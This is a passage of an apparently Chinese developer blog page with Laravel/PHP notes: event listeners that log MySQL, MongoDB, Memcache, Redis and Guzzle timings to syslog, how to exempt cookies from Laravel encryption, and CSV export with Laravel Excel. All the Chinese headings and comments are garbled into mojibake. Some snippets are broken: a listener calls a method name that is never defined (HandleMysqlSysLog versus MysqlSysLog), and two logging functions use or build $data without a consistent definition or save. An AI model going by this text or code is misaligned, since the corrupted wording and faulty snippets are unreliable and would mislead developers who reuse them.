<span class="comment">//Mysql event handle</span></span><br><span class="line">           $app[<span class="string">'events'</span>]-&gt;listen(<span class="string">'illuminate.query'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">$sql, $binds, $time,$name</span>) <span class="title">use</span> (<span class="params">$app</span>)</span>&#123;</span><br><span class="line">               self::HandleMysqlSysLog($sql, $binds, $time, $name, $app);</span><br><span class="line">           &#125;);</span><br><span class="line">   </span><br><span class="line">           <span class="comment">//MongoDB event handle</span></span><br><span class="line">           $app[<span class="string">'events'</span>]-&gt;listen(<span class="string">'eloquent.saved'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">$model</span>) <span class="title">use</span> (<span class="params">$app</span>)</span>&#123;</span><br><span class="line">               self::MongodbSysLog(<span class="string">'saved'</span>, $app, $model);</span><br><span class="line">           &#125;);</span><br><span class="line">           $app[<span class="string">'events'</span>]-&gt;listen(<span class="string">'eloquent.deleted'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">$model</span>) <span class="title">use</span> (<span class="params">$app</span>)</span>&#123;</span><br><span class="line">               self::MongodbSysLog(<span class="string">'deleted'</span>, $app, $model);</span><br><span class="line">           &#125;);</span><br><span class="line">   </span><br><span class="line">           <span class="comment">//Memcache event handle</span></span><br><span class="line">           $app[<span class="string">'events'</span>]-&gt;listen(<span class="string">'cache.write'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">$key, $value, $time, $total</span>) <span class="title">use</span> (<span class="params">$app</span>)</span>&#123;</span><br><span class="line">               self::MemcacheSysLog(<span class="string">'put'</span>,$key,$total);</span><br><span class="line">           &#125;);</span><br><span class="line">           $app[<span class="string">'events'</span>]-&gt;listen(<span class="string">'cache.delete'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">$key, $total</span>) <span class="title">use</span> (<span class="params">$app</span>)</span>&#123;</span><br><span class="line">               self::MemcacheSysLog(<span class="string">'delete'</span>,$key,$total);</span><br><span class="line">           &#125;);</span><br><span class="line">           $app[<span class="string">'events'</span>]-&gt;listen(<span class="string">'cache.hit'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">$key, $value, $total</span>) <span class="title">use</span> (<span class="params">$app</span>)</span>&#123;</span><br><span class="line">               self::MemcacheSysLog(<span class="string">'get'</span>,$key,$total);</span><br><span class="line">           &#125;);</span><br><span class="line">           $app[<span class="string">'events'</span>]-&gt;listen(<span class="string">'cache.missed'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">$key, $total</span>) <span class="title">use</span> (<span class="params">$app</span>)</span>&#123;</span><br><span class="line">               self::MemcacheSysLog(<span class="string">'missed'</span>,$key,$total);</span><br><span class="line">           &#125;);</span><br><span class="line">           </span><br><span class="line">  public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">MysqlSysLog</span>(<span class="params">$sql, $binds, $time, $name, $app</span>)</span>&#123;</span><br><span class="line">          foreach ($binds <span class="keyword">as</span> $bind) &#123;</span><br><span class="line">              $sql = preg_replace(<span class="string">'/\?/'</span>, <span class="string">'\''</span> . $bind . <span class="string">'\''</span>, $sql, <span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">//è°ƒç”¨selectæ—¶å…ˆåˆ¤æ–­ä½¿ç”¨è¯»åº“è¿˜æ˜¯å†™åº“ï¼Œè€Œinsert/update/deleteç»Ÿä¸€ä½¿ç”¨å†™åº“ Illuminate/Database/Connectors/ConnectionFactory.php Illuminate/Database/Connection.php</span></span><br><span class="line">          $connection = $app[<span class="string">'db'</span>]-&gt;getconnections();</span><br><span class="line">          <span class="keyword">if</span> ($name) &#123;</span><br><span class="line">              <span class="keyword">if</span> (preg_match(<span class="string">'#^select[\s\S]*$#'</span>, $sql, $match)) &#123;</span><br><span class="line">                  $pdo = $connection[$name]-&gt;getreadPdo();</span><br><span class="line">                  $host = explode(<span class="string">' '</span>, $pdo-&gt;getAttribute(\PDO::ATTR_CONNECTION_STATUS))[<span class="number">0</span>]; </span><br><span class="line">                  $server_info = $pdo-&gt;getAttribute(\PDO::ATTR_SERVER_INFO);</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                  $pdo = $connection[$name]-&gt;getpdo();</span><br><span class="line">                  $host = explode(<span class="string">' '</span>, $pdo-&gt;getAttribute(\PDO::ATTR_CONNECTION_STATUS))[<span class="number">0</span>];</span><br><span class="line">                  $server_info = $pdo-&gt;getAttribute(\PDO::ATTR_SERVER_INFO);</span><br><span class="line">              &#125;</span><br><span class="line">  </span><br><span class="line">              $data = [</span><br><span class="line">                  <span class="string">'rs'</span> =&gt; <span class="string">'mysql://'</span> . $host.<span class="string">':'</span>.$connection[$name]-&gt;getconfig(<span class="string">'port'</span>) . <span class="string">'/'</span> . $connection[$name]-&gt;getconfig(<span class="string">'name'</span>),</span><br><span class="line">                   <span class="string">'cmd'</span> =&gt; $sql,</span><br><span class="line">                  <span class="string">'output_content'</span> =&gt; [</span><br><span class="line">                      <span class="string">'database'</span> =&gt; $connection[$name]-&gt;getconfig(<span class="string">'database'</span>),</span><br><span class="line">                      <span class="string">'host'</span> =&gt; $host,</span><br><span class="line">                      <span class="string">'name'</span> =&gt; $connection[$name]-&gt;getconfig(<span class="string">'name'</span>),</span><br><span class="line">                      <span class="string">'port'</span> =&gt; $connection[$name]-&gt;getconfig(<span class="string">'port'</span>),</span><br><span class="line">                      <span class="string">'driver'</span> =&gt; $connection[$name]-&gt;getconfig(<span class="string">'driver'</span>),</span><br><span class="line">                      <span class="string">'server_info'</span> =&gt; $server_info</span><br><span class="line">                  ],</span><br><span class="line">                  <span class="string">'t_total'</span> =&gt; $time</span><br><span class="line">              ]; </span><br><span class="line">              self::SaveSysLog($data);</span><br><span class="line">          &#125; </span><br><span class="line">      &#125;         </span><br><span class="line">      public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">MemcacheSysLog</span>(<span class="params">$cmd, $key, $total</span>)</span>&#123;</span><br><span class="line">              <span class="keyword">if</span>(app(<span class="string">'cache'</span>)-&gt;getStore() <span class="keyword">instanceof</span> \Illuminate\Cache\MemcachedStore)&#123;</span><br><span class="line">                  $servers = implode(<span class="string">'/'</span>, array_keys(app(<span class="string">'cache'</span>)-&gt;getMemcached()-&gt;getStats()));</span><br><span class="line">                  $data = [</span><br><span class="line">                      <span class="string">'rs'</span> =&gt; <span class="string">'mc://'</span> . $servers,</span><br><span class="line">                       <span class="string">'cmd'</span> =&gt; $cmd . <span class="string">' '</span> . $key,</span><br><span class="line">                      <span class="string">'t_total'</span> =&gt; $total,</span><br><span class="line">                      <span class="string">'code'</span> =&gt; <span class="number">0</span></span><br><span class="line">                  ];</span><br><span class="line">              &#125;  </span><br><span class="line">       self::SaveSysLog($data);</span><br><span class="line">           &#125;     </span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">MongodbSysLog</span>(<span class="params">$cmd, $app, $model</span>)</span>&#123;</span><br><span class="line">            $connection = $app[<span class="string">'db'</span>]-&gt;getconnections();</span><br><span class="line">            <span class="keyword">if</span>(isset($connection[<span class="string">'mongodb'</span>])) &#123;</span><br><span class="line">                $data = [</span><br><span class="line">                    <span class="string">'rs'</span> =&gt; <span class="string">'Mongo://'</span> . $connection[<span class="string">'mongodb'</span>]-&gt;getconfig(<span class="string">'host'</span>) . <span class="string">':'</span> . $connection[<span class="string">'mongodb'</span>]-&gt;getconfig(<span class="string">'port'</span>) ,</span><br><span class="line">                     <span class="string">'cmd'</span> =&gt; $cmd,</span><br><span class="line">                    <span class="string">'output_content'</span> =&gt; [</span><br><span class="line">                        <span class="string">'database'</span> =&gt; $connection[<span class="string">'mongodb'</span>]-&gt;getconfig(<span class="string">'database'</span>),</span><br><span class="line">                        <span class="string">'host'</span> =&gt; $connection[<span class="string">'mongodb'</span>]-&gt;getconfig(<span class="string">'host'</span>),</span><br><span class="line">                        <span class="string">'port'</span> =&gt; $connection[<span class="string">'mongodb'</span>]-&gt;getconfig(<span class="string">'port'</span>),</span><br><span class="line">                        <span class="string">'driver'</span> =&gt; $connection[<span class="string">'mongodb'</span>]-&gt;getconfig(<span class="string">'driver'</span>)</span><br><span class="line">                    ],</span><br><span class="line">                    <span class="string">'t_total'</span> =&gt; $model-&gt;_time_cost_total,</span><br><span class="line">                    <span class="string">'rs_content'</span> =&gt; $model-&gt;toArray()[<span class="string">'_id'</span>]</span><br><span class="line">                ];</span><br><span class="line">            &#125;  </span><br><span class="line">            </span><br><span class="line">            self::SaveSysLog($data);</span><br><span class="line">        &#125;   </span><br><span class="line">        public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">SaveSysLog</span>(<span class="params">$data</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(php_sapi_name()==<span class="string">'cli'</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> ;</span><br><span class="line">                &#125;</span><br><span class="line">        </span><br><span class="line">                 openlog(<span class="string">'app'</span>,LOG_PID|LOG_ODELAY,LOG_LOCAL6);</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    syslog(LOG_INFO,json_encode($data));</span><br><span class="line">                &#125; <span class="keyword">catch</span> (\Exception $e) &#123;</span><br><span class="line">                    \Log::info(<span class="string">'syslog_error'</span>, [<span class="string">'data'</span> =&gt; $data]);</span><br><span class="line">                &#125;</span><br><span class="line">                closelog();</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">vendor/laravel/framework/src/Illuminate/Cache/MemcachedStore.php:<span class="number">164</span>            </span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;start = microtime(<span class="literal">true</span>);</span><br><span class="line">		$value = $<span class="keyword">this</span>-&gt;memcached-&gt;get($<span class="keyword">this</span>-&gt;prefix.$key);</span><br><span class="line">        <span class="comment">//$total = round((microtime(true) - $this-&gt;start) * 1000, 2);</span></span><br><span class="line">        $<span class="keyword">this</span>-&gt;end = microtime(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        $<span class="keyword">this</span>-&gt;handleMcSysLog(<span class="string">'get'</span>, $key);</span><br><span class="line">		<span class="keyword">if</span> ($<span class="keyword">this</span>-&gt;memcached-&gt;getResultCode() == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> $value;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;            </span><br><span class="line">            </span><br><span class="line">     private <span class="function"><span class="keyword">function</span> <span class="title">handleMcSysLog</span>(<span class="params">$cmd, $key</span>)</span></span><br><span class="line"><span class="function">         </span>&#123;</span><br><span class="line">             $total = round(($<span class="keyword">this</span>-&gt;end - $<span class="keyword">this</span>-&gt;start) * <span class="number">1000</span>, <span class="number">2</span>);</span><br><span class="line">             $rs = implode(<span class="string">'/'</span>, array_keys($<span class="keyword">this</span>-&gt;memcached-&gt;getStats()));</span><br><span class="line">             $data = [</span><br><span class="line">                 <span class="string">'rs'</span> =&gt; <span class="string">'mc://'</span> . $rs,</span><br><span class="line">                 <span class="string">'rs_type'</span> =&gt; <span class="number">6</span>,</span><br><span class="line">                 <span class="string">'cmd'</span> =&gt; $cmd . <span class="string">' '</span> . $key,</span><br><span class="line">                 <span class="string">'t_total'</span> =&gt; $total,</span><br><span class="line">                 <span class="string">'code'</span> =&gt; $<span class="keyword">this</span>-&gt;memcached-&gt;getLastErrorCode(),</span><br><span class="line">                 <span class="string">'ext'</span> =&gt; $<span class="keyword">this</span>-&gt;memcached-&gt;getLastErrorMessage()</span><br><span class="line">             ];</span><br><span class="line">             </span><br><span class="line">     </span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure>
<h3 id="è®°å½•Redisè¿è¡Œæ—¶é—´"><a href="#è®°å½•Redisè¿è¡Œæ—¶é—´" class="headerlink" title="è®°å½•Redisè¿è¡Œæ—¶é—´"></a>è®°å½•Redisè¿è¡Œæ—¶é—´</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">predis</span><br><span class="line"></span><br><span class="line">use \Predis\Command\CommandInterface;</span><br><span class="line">use \Predis\Connection\StreamConnection;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RedisLog</span> <span class="keyword">extends</span> <span class="title">StreamConnection</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    private $tstart = <span class="number">0</span>;</span><br><span class="line">    private $debugBuffer = array();</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;tstart = microtime(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        parent::connect();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="function"><span class="keyword">function</span> <span class="title">storeDebug</span>(<span class="params">CommandInterface $command, $direction</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $firtsArg = $command-&gt;getArguments();</span><br><span class="line">        $timestamp = round((microtime(<span class="literal">true</span>) - $<span class="keyword">this</span>-&gt;tstart) * <span class="number">1000</span>,<span class="number">2</span>);</span><br><span class="line">        $log = [];</span><br><span class="line">        $log[<span class="string">'cmd'</span>] = $command-&gt;getId();</span><br><span class="line">        $log[<span class="string">'key'</span>] = isset($firtsArg) ?  $firtsArg  : <span class="string">' '</span>;</span><br><span class="line">        $log[<span class="string">'server'</span>] = <span class="string">"$direction $this"</span>;</span><br><span class="line">        $log[<span class="string">'time'</span>] = $timestamp;</span><br><span class="line">        dump([<span class="string">'rs'</span> =&gt; <span class="string">'redis://'</span> . trim($log[<span class="string">'server'</span>]), <span class="string">'cmd'</span> =&gt; $command-&gt;getId(),   <span class="string">'t_total'</span> =&gt; $timestamp]);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//        $this-&gt;debugBuffer[] = &amp;$log;</span></span><br><span class="line">        unset($log);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">writeRequest</span>(<span class="params">CommandInterface $command</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;tstart = microtime(<span class="literal">true</span>);<span class="comment">//æ‰§è¡Œå‘½ä»¤è¡Œçš„æ—¶å€™é‡æ–°ç®— è¿™æ ·å°±ä¸ä¼šå åŠ </span></span><br><span class="line">        parent::writeRequest($command);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        $this-&gt;storeDebug($command, '-&gt;');</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">readResponse</span>(<span class="params">CommandInterface $command</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $response = parent::readResponse($command);</span><br><span class="line">        $<span class="keyword">this</span>-&gt;storeDebug($command, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $response;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">getDebugBuffer</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;debugBuffer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">debug</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $options = array(</span><br><span class="line">            <span class="string">'connections'</span> =&gt;[</span><br><span class="line">                <span class="string">'tcp'</span> =&gt; <span class="string">'\App\Services\RedisLog'</span>,</span><br><span class="line">            ],</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $client = <span class="keyword">new</span> \Predis\Client(config(<span class="string">'database.redis'</span>), $options);</span><br><span class="line">        $client-&gt;get(<span class="string">'redis:test'</span>);</span><br><span class="line"></span><br><span class="line">        var_export($client-&gt;getConnection());</span><br><span class="line">        <span class="comment">/* OUTPUT:</span></span><br><span class="line"><span class="comment">        array (</span></span><br><span class="line"><span class="comment">          0 =&gt; 'SELECT 15 -&gt; 127.0.0.1:6379 [0.0008s]',</span></span><br><span class="line"><span class="comment">          1 =&gt; 'SELECT 15 &lt;- 127.0.0.1:6379 [0.001s]',</span></span><br><span class="line"><span class="comment">          2 =&gt; 'SET foo -&gt; 127.0.0.1:6379 [0.001s]',</span></span><br><span class="line"><span class="comment">          3 =&gt; 'SET foo &lt;- 127.0.0.1:6379 [0.0011s]',</span></span><br><span class="line"><span class="comment">          4 =&gt; 'GET foo -&gt; 127.0.0.1:6379 [0.0013s]',</span></span><br><span class="line"><span class="comment">          5 =&gt; 'GET foo &lt;- 127.0.0.1:6379 [0.0015s]',</span></span><br><span class="line"><span class="comment">          6 =&gt; 'INFO -&gt; 127.0.0.1:6379 [0.0019s]',</span></span><br><span class="line"><span class="comment">          7 =&gt; 'INFO &lt;- 127.0.0.1:6379 [0.0022s]',</span></span><br><span class="line"><span class="comment">        )</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="è®°å½•guggleè¿è¡Œæ—¶é—´"><a href="#è®°å½•guggleè¿è¡Œæ—¶é—´" class="headerlink" title="è®°å½•guggleè¿è¡Œæ—¶é—´"></a>è®°å½•guggleè¿è¡Œæ—¶é—´</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">use Illuminate\Http\Request;</span><br><span class="line">use GuzzleHttp\Event\EmitterInterface;</span><br><span class="line">use GuzzleHttp\Event\BeforeEvent;</span><br><span class="line">use GuzzleHttp\Event\CompleteEvent;</span><br><span class="line">use GuzzleHttp\Event\EndEvent;</span><br><span class="line">use GuzzleHttp\Event\Emitter;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GuzzleEmitter</span> <span class="keyword">extends</span> <span class="title">Emitter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$rs_info = <span class="string">'api_time'</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $start = <span class="number">0</span>;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;on(<span class="string">'before'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">BeforeEvent $event, $name</span>) <span class="title">use</span>(<span class="params">&amp;$start, $rs_info</span>)</span>&#123;</span><br><span class="line">            $start = microtime(<span class="literal">true</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">        $<span class="keyword">this</span>-&gt;on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">EndEvent $event</span>) <span class="title">use</span>(<span class="params">&amp;$start, $rs_info</span>)</span>&#123;</span><br><span class="line">            $url = $event-&gt;gettransferInfo()[<span class="string">'url'</span>];</span><br><span class="line">            $parse = parse_url($url);</span><br><span class="line">            <span class="keyword">if</span> ($event-&gt;getException()) &#123;</span><br><span class="line">                dump([<span class="string">'rs'</span> =&gt; $url, <span class="string">'ext1'</span> =&gt; sprintf(<span class="string">'%s://%s%s'</span>,$parse[<span class="string">'scheme'</span>],$parse[<span class="string">'host'</span>],$parse[<span class="string">'path'</span>]), <span class="string">'cmd'</span> =&gt; $event-&gt;getRequest()-&gt;getmethod(), <span class="string">'code'</span> =&gt; $event-&gt;gettransferInfo()[<span class="string">'http_code'</span>],   <span class="string">'t_total'</span> =&gt; intval((microtime(<span class="literal">true</span>)-$start)*<span class="number">1000</span>), <span class="string">'p_ip'</span> =&gt; $event-&gt;gettransferInfo()[<span class="string">'primary_ip'</span>], <span class="string">'req_id'</span>=&gt;defined(<span class="string">'REQUEST_ID'</span>)?(REQUEST_ID):<span class="string">''</span>,]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $method=$event-&gt;getRequest()-&gt;getmethod();</span><br><span class="line">                $post_data=($method==<span class="string">'POST'</span>)?((string)$event-&gt;getRequest()-&gt;getBody()):<span class="string">''</span>;</span><br><span class="line">                dump([</span><br><span class="line">                    <span class="string">'rs'</span> =&gt; $url,</span><br><span class="line">                    <span class="string">'cmd'</span> =&gt; $method,</span><br><span class="line">                    <span class="string">'code'</span> =&gt; $event-&gt;gettransferInfo()[<span class="string">'http_code'</span>],</span><br><span class="line">                     <span class="string">'t_total'</span> =&gt; intval((microtime(<span class="literal">true</span>)-$start)*<span class="number">1000</span>),</span><br><span class="line">                    <span class="string">'p_ip'</span> =&gt; $event-&gt;gettransferInfo()[<span class="string">'primary_ip'</span>],</span><br><span class="line">                    <span class="string">'rs_content'</span>=&gt;$post_data,</span><br><span class="line">                    <span class="string">'ext1'</span> =&gt; sprintf(<span class="string">'%s://%s%s'</span>,$parse[<span class="string">'scheme'</span>],$parse[<span class="string">'host'</span>],$parse[<span class="string">'path'</span>]),</span><br><span class="line">                    <span class="string">'req_id'</span>=&gt;defined(<span class="string">'REQUEST_ID'</span>)?(REQUEST_ID):<span class="string">''</span>,</span><br><span class="line">                ]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="æœªåŠ å¯†çš„-Cookie"><a href="#æœªåŠ å¯†çš„-Cookie" class="headerlink" title="æœªåŠ å¯†çš„ Cookie"></a>æœªåŠ å¯†çš„ Cookie</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">é»˜è®¤æƒ…å†µä¸‹ï¼ŒLaravel ç”Ÿæˆçš„æ‰€æœ‰ cookie éƒ½æ˜¯ç»è¿‡åŠ å¯†å’Œç­¾åçš„ï¼Œé˜²æ­¢è¢«éæ³•ç¯¡æ”¹ã€‚ä½† Laravel ä¹Ÿæ”¯æŒä¸å¯¹ cookie åŠ å¯†ï¼Œå…·ä½“åšæ³•å¦‚ä¸‹ï¼š</span><br><span class="line"></span><br><span class="line">ä¿®æ”¹ app/Http/Middleware ç›®å½•ä¸­ App\Http\Middleware\EncryptCookies ä¸­é—´ä»¶çš„ $except å±æ€§ï¼Œè¯¥å±æ€§æ˜¯ä¸ªæ•°ç»„ï¼ŒæŠŠä¸éœ€åŠ å¯†çš„ cookie ååŠ å…¥åˆ°è¯¥æ•°ç»„å±æ€§ä¸­å°±å¯ä»¥äº†ï¼š</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä¸éœ€è¦è¢«åŠ å¯†çš„cookiesåç§°</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @var array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">protected $except = [</span><br><span class="line">    <span class="string">'cookie_name'</span>,</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
<h3 id="æ— æ³•è·å–-cookie"><a href="#æ— æ³•è·å–-cookie" class="headerlink" title="æ— æ³•è·å– cookie"></a>æ— æ³•è·å– cookie</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è·å–cookieçš„ä¸‰ç§å°è¯•</span></span><br><span class="line">Cookie::get(<span class="string">'cookie_name'</span>);</span><br><span class="line">request()-&gt;cookie(<span class="string">'cookie_name'</span>);</span><br><span class="line">$request-&gt;cookie(<span class="string">'cookie_name'</span>)ï¼›</span><br><span class="line"><span class="comment">//è¿”å›å€¼å‡ä¸ºnull laravel è®¾ç½® cookie æ˜¯åŠ å¯†ä¹‹åçš„ï¼Œè€Œæˆ‘è·å–çš„ cookie æ˜¯å¤–æ¥ cookieï¼Œç”±äºè§£å¯†å¤±è´¥ï¼Œæ‰€ä»¥æ€ä¹ˆè·å–éƒ½æ˜¯ç©º</span></span><br><span class="line">https:<span class="comment">//learnku.com/laravel/t/31939</span></span><br><span class="line"><span class="comment">//æ·»åŠ åˆ°cookieåç§°åˆ° App\Http\Middleware\EncryptCookies çš„ æ’é™¤åå• ä¸­ï¼š</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EncryptCookies</span> <span class="keyword">extends</span> <span class="title">Middleware</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    protected $except = [</span><br><span class="line">      <span class="string">'cookie_name'</span>,</span><br><span class="line">      ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Laravel-Excel-å¯¼å‡º-csv"><a href="#Laravel-Excel-å¯¼å‡º-csv" class="headerlink" title="Laravel Excel å¯¼å‡º csv"></a>Laravel Excel å¯¼å‡º csv</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Laravel Excel <span class="number">2.0</span> çš„ç‰ˆæœ¬å’Œ <span class="number">3.0</span> çš„ç‰ˆæœ¬æœ‰å¾ˆå¤§çš„åŒºåˆ«ï¼Œä½¿ç”¨ composer åŠ è½½çš„æ—¶å€™è¦æ³¨æ„ç‰ˆæœ¬ï¼Œ<span class="number">3.0</span> å’Œ <span class="number">2.0</span> çš„è¯­æ³•åŸºæœ¬ä¸åŒäº†</span><br><span class="line">composer <span class="built_in">require</span> maatwebsite/excel ~<span class="number">2.1</span></span><br><span class="line">php artisan vendor:publish --provider=<span class="string">"Maatwebsite\Excel\ExcelServiceProvider"</span>  </span><br><span class="line">config/excel.php ä¸­æ‰¾åˆ° csvï¼ŒæŠŠé‡Œé¢çš„ use_bom=&gt;<span class="literal">false</span> æ”¹ä¸º use_bom=&gt;<span class="literal">true</span>ï¼Œè¿™æ ·å¯¼å‡ºçš„ csv æ–‡ä»¶å°±ä¼šæœ‰ bom å¤´ï¼Œä¸ä¼šå‡ºç°ä¹±ç ã€‚</span><br><span class="line"></span><br><span class="line">Excel::create(iconv(<span class="string">'UTF-8'</span>, <span class="string">'GBK'</span>, <span class="string">'æ–‡ç« ç‚¹èµæ•°æ®'</span>),<span class="function"><span class="keyword">function</span> 